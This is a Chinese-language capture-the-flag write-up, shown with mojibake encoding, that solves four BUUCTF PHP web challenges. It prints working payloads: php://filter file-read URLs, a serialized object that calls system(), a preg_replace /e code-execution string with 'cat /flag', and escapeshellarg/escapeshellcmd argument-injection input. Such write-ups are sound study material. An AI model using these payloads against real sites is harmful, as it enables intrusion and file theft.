<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>æ‰«å‡ºflag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f284a61f7b.png" alt="5b963d116ac7f02965c9aced93849dee.png"><br>è¿™å¼ å¾ˆæœ‰ç‹éœ¸ä¹‹æ°”<br>?category=php://filter/read.convert.base64-encode/resource=index.php<br>Failed opening â€˜php://filter/read.convert.base64-encode/resource=index.php.php<br>?category=php://filter/read.convert.base64-encode/resource=index<br>?category=php://filter/read.convert.base64-encode/resource=flagä¸è¡Œ<br>çœ‹äº†githubå‘ç°åŸæ¥å¯ä»¥é…±<br>?category=php://filter/convert.base64-encode/write=woofers/resource=flag</p>
<hr>
<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><p>èƒ½ä¸èƒ½å°‘æ”¾äº›å¯æ€•çš„å›¾çœŸçš„å¾ˆå“äººã€‚ã€‚ã€‚</p>
<blockquote>
<p>func=date&amp;p=Y-m-d+h%3Ai%3As+a<br>date() å‡½æ•°p åº”è¯¥æ˜¯ date() å‡½æ•°æ‰€éœ€çš„æ ¼å¼å‚æ•°ã€‚<br>%3A æ˜¯ URL ç¼–ç åçš„å†’å· :ï¼Œæ‰€ä»¥ h%3Ai%3As å®é™…å°±æ˜¯ h:i:sã€‚</p>
<ul>
<li>åœ¨ URL é‡Œé€šå¸¸è¡¨ç¤ºç©ºæ ¼ï¼Œè¿™é‡Œå¯å½“ä½œç©ºæ ¼çœ‹å¾…ã€‚ï¼ˆai</li>
</ul>
</blockquote>
<p><code>function 'base64' not found or invalid function name in</code><br>é‚£å°±å†æ‰¾æ‰¾,è¯•äº†è¯•serializeè¡Œï¼Œsystemè¢«è¿‡æ»¤äº†ã€‚</p>
<blockquote>
<p>file_get_contentsã€highlight_file() ï¼Œshow_source()</p>
</blockquote>
<p><img src="https://pick.lwzheng.tech/2025/02/02/679f54f631e71.png" alt="87bd2fdb103c30c69844228612a6f76d.png"><br><code>func=highlight_file&amp;p=index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š<span class="token operator">?</span>php

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'find / -name "*flag*"'</span><span class="token punctuation">;</span> 
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"find / -name "</span><span class="token operator">*</span>flag<span class="token operator">*</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
 <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /tmp/flagoefiu4r93'</span><span class="token punctuation">;</span>ï¼ˆæŒºæ— è¯­çš„è¯•å‡ºæ¥çš„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ–phpå†…çš„â€ \ â€œåœ¨åšä»£ç æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šè¯†åˆ«ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œç»•è¿‡é»‘åå•<br><code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code></p>
<hr>
<h3 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h3><p><a target="_blank" rel="noopener" href="http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I">http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I</a> have a dreamâ€¦â€¦<br><img src="https://pick.lwzheng.tech/2025/02/02/679f620a14e68.png" alt="154b514c66b309cfe4aae38adf72a224.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š<span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=&gt;</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#åŠ¨æ€èµ‹å€¼çš„è¿‡ç¨‹ï¼Œå³ä¼šå°†getè¯·æ±‚ä¸­çš„å‚æ•°åä½œä¸ºé”®$reï¼Œå‚æ•°å¯¹åº”çš„å€¼ä½œä¸ºé”®å€¼$str</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://">http://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sentry-fei/p/15476811.html%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%80%E4%BA%9B%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95">https://www.cnblogs.com/Sentry-fei/p/15476811.htmlè¿™é‡Œæœ‰ä¸€äº›æœ¬åœ°æµ‹è¯•</a><br><a href="https://">https://www.runoob.com/php/php-preg_replace.html</a></p>
<p><code>\1</code> ä»£è¡¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç¬¬ä¸€ä¸ªæ•è·ç»„æ‰€åŒ¹é…åˆ°çš„å†…å®¹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç»“æœï¼šå­—ç¬¦ä¸²'11'</span>
<span class="token comment">#ç”±äºæ›¿æ¢å­—ç¬¦ä¸²æ˜¯ç®€å•çš„ '1'ï¼ŒPHP ä¼šå°è¯•å°†å…¶å½“ä½œä»£ç æ‰§è¡Œï¼Œä½†å®ƒå¹¶ä¸æ˜¯æœ‰æ•ˆçš„ PHP è¡¨è¾¾å¼ã€‚ä¸è¿‡åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œpreg_replace çš„è¡Œä¸ºæ¯”è¾ƒç‰¹æ®Šï¼Œç”±äºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æ›¿æ¢å­—ç¬¦ä¸²ä¼šè¢«æ‰§è¡Œï¼Œæœ€ç»ˆçš„æ›¿æ¢ç»“æœä¼šå‡ºç°ä¸¤æ¬¡ '1'ï¼Œæ‰€ä»¥è¾“å‡ºä¸º '11'</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'strtolower("\1")'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç»“æœï¼šç©ºå­—ç¬¦ä¸²''</span>
<span class="token comment">#\1 ä»£è¡¨ç¬¬ä¸€ä¸ªæ•è·ç»„åŒ¹é…çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªè¾“å…¥å­—ç¬¦ä¸² {${phpinfo()}}ã€‚strtolower å‡½æ•°ç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚ç„¶è€Œï¼Œå½“ phpinfo() è¢«æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šè¾“å‡ºå¤§é‡çš„ PHP é…ç½®ä¿¡æ¯åˆ°æ ‡å‡†è¾“å‡ºæµï¼Œå¹¶ä¸” strtolower å‡½æ•°å¯¹ phpinfo() çš„è¿”å›å€¼ï¼ˆå®é™…ä¸Š phpinfo() è¿”å›å€¼ä¸º nullï¼‰è¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆå¯¼è‡´æ•´ä¸ªæ›¿æ¢æ“ä½œçš„ç»“æœå˜å¾—æ··ä¹±ã€‚ç”±äº phpinfo() è¾“å‡ºäº†å†…å®¹ï¼Œå¹¶ä¸”åœ¨è¿™ç§æ‰§è¡Œé€»è¾‘ä¸‹ï¼Œæœ€ç»ˆè¿”å›ç»™ preg_replace çš„ç»“æœå¯èƒ½ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æœ€ç»ˆè¾“å‡ºä¸º ''ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>\\</code> ä¼šè½¬ä¹‰ä¸ºå•ä¸ª <code>\</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ <code>\1</code> ä»£è¡¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç¬¬ä¸€ä¸ªæ•è·ç»„æ‰€åŒ¹é…åˆ°çš„å†…å®¹ã€‚</p>
<p>.* æ•´ä½“çš„æ„æ€æ˜¯åŒ¹é…ä»»æ„æ•°é‡ï¼ˆåŒ…æ‹¬é›¶ä¸ªï¼‰çš„ä»»æ„å­—ç¬¦ã€‚e ä¿®é¥°ç¬¦å­˜åœ¨ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚å› ä¸ºå®ƒå…è®¸æ‰§è¡Œä»»æ„ PHP ä»£ç <br>${phpinfo()} ï¼šä¸æ‰§è¡Œ<br> {${phpinfo()}}ï¼šæ‰§è¡Œ</p>
<blockquote>
<ul>
<li><strong><code>.</code></strong>ï¼šåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œç‚¹å·ï¼ˆ<code>.</code>ï¼‰æ˜¯ä¸€ä¸ªå…ƒå­—ç¬¦ï¼Œå®ƒé»˜è®¤åŒ¹é…é™¤æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œåœ¨å­—ç¬¦ä¸² <code>"abc"</code> ä¸­ï¼Œ<code>.</code> å¯ä»¥åŒ¹é… <code>a</code>ã€<code>b</code> æˆ–è€… <code>c</code> ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</li>
<li><strong><code>\S</code></strong>ï¼šè¿™æ˜¯ä¸€ä¸ªé¢„å®šä¹‰å­—ç¬¦ç±»ï¼Œ<code>\S</code> è¡¨ç¤ºåŒ¹é…ä»»æ„éç©ºç™½å­—ç¬¦ã€‚ç©ºç™½å­—ç¬¦åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼Œéç©ºç™½å­—ç¬¦å°±æ˜¯é™¤è¿™äº›ä¹‹å¤–çš„å­—ç¬¦ï¼Œæ¯”å¦‚å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ç­‰ã€‚</li>
<li><strong><code>\*</code></strong>ï¼šè¿™æ˜¯ä¸€ä¸ªé‡è¯ï¼Œå®ƒè¡¨ç¤ºå‰é¢çš„å…ƒç´ å¯ä»¥å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚åœ¨ <code>\S*</code> ä¸­ï¼Œæ„å‘³ç€éç©ºç™½å­—ç¬¦å¯ä»¥å‡ºç°é›¶ä¸ªã€ä¸€ä¸ªæˆ–è€…å¤šä¸ªè¿ç»­çš„éç©ºç™½å­—ç¬¦ã€‚</li>
</ul>
</blockquote>
<!--strtolower("{${1}}") åˆç›¸å½“äº strtolower("{null}"), åˆç›¸å½“äº ``''` `ç©ºå­—ç¬¦ä¸²ã€‚å•çº¯åœ°å°†æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™ã€‚åŒæ ·ï¼Œå¯¹äº `"{null}"`ï¼Œ`strtolower` ä¹Ÿæ˜¯å¯¹æ•´ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ã€‚è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²åœ¨ `strtolower` å‡½æ•°çš„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œè€Œå®ƒä»¬æœ¬èº«éƒ½æ²¡æœ‰å¤§å†™å­—æ¯-->

<!--å°†.*æ”¹æˆ\S*-->(åœ¨PHPä¸­ï¼Œå¯¹äºä¼ å…¥çš„éæ³•çš„ $_GET æ•°ç»„å‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ­£åˆ™åŒ¹é…å¤±æ•ˆã€‚)

<p>åŠ¨æ€èµ‹å€¼çš„è¿‡ç¨‹ï¼Œå³ä¼šå°†getè¯·æ±‚ä¸­çš„å‚æ•°åä½œä¸ºé”®$reï¼Œå‚æ•°å¯¹åº”çš„å€¼ä½œä¸ºé”®å€¼$str</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span><span class="token operator">.</span>\<span class="token constant">S</span><span class="token operator">*</span><span class="token operator">.</span><span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#'.\S*.' è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ•´ä½“çš„å«ä¹‰æ˜¯åŒ¹é…ä»¥ä»»æ„ä¸€ä¸ªéæ¢è¡Œå­—ç¬¦å¼€å§‹ï¼Œæ¥ç€æ˜¯é›¶ä¸ªæˆ–å¤šä¸ªéç©ºç™½å­—ç¬¦ï¼Œæœ€åå†ä»¥ä»»æ„ä¸€ä¸ªéæ¢è¡Œå­—ç¬¦ç»“æŸçš„å­—ç¬¦ä¸²</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=&gt;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("${getFlag()}")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">=&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'${getFlag()}'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>next.php?\S*=${getFlag()}&amp;cmd=system('cat /flag');</code></p>
<hr>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š<span class="token operator">?</span>php

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>[<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">æµ…è°ˆescapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/æµ…è°ˆescapeshellargä¸å‚æ•°æ³¨å…¥/#escapeshellarg</a></p>
<p><strong>escapeshellarg</strong></p>
<p>ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·çš„è¾“å…¥é€ƒé€¸å‡ºâ€œå‚æ•°å€¼â€çš„ä½ç½®ï¼Œå˜æˆä¸€ä¸ªâ€œå‚æ•°é€‰é¡¹â€ã€‚</p>
<p>å¤„ç†è¿‡ç¨‹ï¼šå¦‚æœè¾“å…¥å†…å®¹ä¸åŒ…å«å•å¼•å·ï¼Œåˆ™ç›´æ¥å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²æ·»åŠ ä¸€å¯¹å•å¼•å·æ‹¬èµ·æ¥ï¼›å¦‚æœè¾“å…¥å†…å®¹åŒ…å«å•å¼•å·ï¼Œåˆ™å…ˆå¯¹è¯¥å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå†å¯¹å‰©ä½™éƒ¨åˆ†å­—ç¬¦ä¸²æ·»åŠ ç›¸åº”å¯¹æ•°çš„å•å¼•å·æ‹¬èµ·æ¥ã€‚</p>
<p>åœºæ™¯åŠŸèƒ½ï¼š</p>
<blockquote>
<p>1.ç¡®ä¿ç”¨æˆ·åªä¼ é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤</p>
<p>2.ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°ä¸€ä¸ª</p>
<p>3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p>
</blockquote>
<p><strong>escapeshellcmd</strong></p>
<p>ä¸»è¦æ˜¯é˜²æ­¢ç”¨æˆ·åˆ©ç”¨shellçš„ä¸€äº›æŠ€å·§ï¼ˆå¦‚åˆ†å·ã€ç®¡é“ç¬¦ã€åå¼•å·ç­‰ï¼‰æ¥è¿›è¡Œå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚</p>
<p>å¤„ç†è¿‡ç¨‹ï¼šå¦‚æœè¾“å…¥å†…å®¹ä¸­&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFç­‰ç‰¹æ®Šå­—ç¬¦ä¼šè¢«åæ–œæ ç»™è½¬ä¹‰æ‰ï¼›å¦‚æœå•å¼•å·å’ŒåŒå¼•å·ä¸æ˜¯æˆå¯¹å‡ºç°æ—¶ï¼Œä¼šè¢«è½¬ä¹‰æ‰ã€‚</p>
<p>åœºæ™¯åŠŸèƒ½ï¼š</p>
<blockquote>
<p>1.ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤</p>
<p>2.ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•°</p>
<p>3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p>
</blockquote>
<p>é€šè¿‡å‚æ•°æ³¨å…¥å‘å‚æ•°é€‰é¡¹æ³¨å…¥<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">è°ˆescapeshellargç»•è¿‡ä¸å‚æ•°æ³¨å…¥æ¼æ´ | ç¦»åˆ«æ­Œ</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š<span class="token operator">?</span>php
<span class="token function">system</span><span class="token punctuation">(</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls --ignore="</span><span class="token operator">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" /tmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo escapeshellcmd("ls --ignore=".escapeshellarg($_GET[c])." /tmp");</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token comment">//åˆå§‹è¾“å…¥</span>
alan<span class="token string single-quoted-string">' -l+

//ç»è¿‡escapeshellarg()å¤„ç†
'</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">'

//æ‹¼æ¥å‘½ä»¤
ls --ignore='</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">' /tmp

//ç»è¿‡escapeshellcmd()å¤„ç†ï¼Œå³ä¸Šå›¾çš„è¾“å‡ºç»“æœ
ls --ignore=\'alan\'\\\'\' -l+ /tmp
ls --ignore='</span>alan<span class="token string single-quoted-string">'\\'</span><span class="token string single-quoted-string">' -l+\' /tmp

//è¾“å‡ºç»“æœç®€åŒ–ï¼Œç­‰åŒäº
ls --ignore=alan\ -l '</span> <span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
